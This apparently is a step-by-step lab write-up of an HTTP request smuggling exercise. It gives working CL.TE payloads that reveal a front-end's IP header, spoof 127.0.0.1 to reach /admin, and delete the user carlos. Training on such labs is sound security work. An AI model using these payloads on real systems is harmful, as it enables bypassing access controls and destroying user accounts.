# Exploiting HTTP request smuggling to reveal front-end request rewriting

## This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

## There's an admin panel at `/admin`, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the `X-Forwarded-For` header but has a different name.

## To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user `carlos`

---

---

### **\_\_\_\_**

step 1

set payload

```
Transfer-Encoding: chunked

userid=test
```

![screenshot](images/images_lab8/lab8_test_first_payload.jpg)

### step2

```
Content-Length: 21
Transfer-Encoding: chunked

b
userid=test
0


```

![screenshot](images/images_lab8/lab8_2nd_payload.jpg)

### step3

```
Content-Length: 20
Transfer-Encoding: chunked

b
userid=test
0


```

![screenshot](images/images_lab8/lab8_2nd_payload_with_content_length_less.jpg)

### step4

```
b
userid=test
0

POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
Host: 127.0.0.1

userid=test
```

![screenshot](images/images_lab8/lab8_unauthorized.jpg)

![screenshot](images/images_lab8/lab8_content_length_add_one.jpg)

### step5

`Content-Length: 11
`search=test`

![screenshot](images/images_lab8/lab8_search_test.jpg)

### step6

```
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```

![screenshot](images/images_lab8/lab8_post_request_search.jpg)

### step7

```
Content-Length: 154
Transfer-Encoding: chunked

0

POST /admin HTTP/1.1
X-AOSTLB-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
connection: closed

search=test

```

![screenshot](images/images_lab8/lab8_administrator.jpg)

### step8

```
Content-Length: 177
Transfer-Encoding: chunked

0

POST /admin/delete?username=carlos HTTP/1.1
X-AOSTLB-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
connection: closed

search=test

```

![screenshot](images/images_lab8/lab8_delete_carlos_account.jpg)

### step9

![screenshot](images/images_lab8/lab8_lab_solved.jpg)
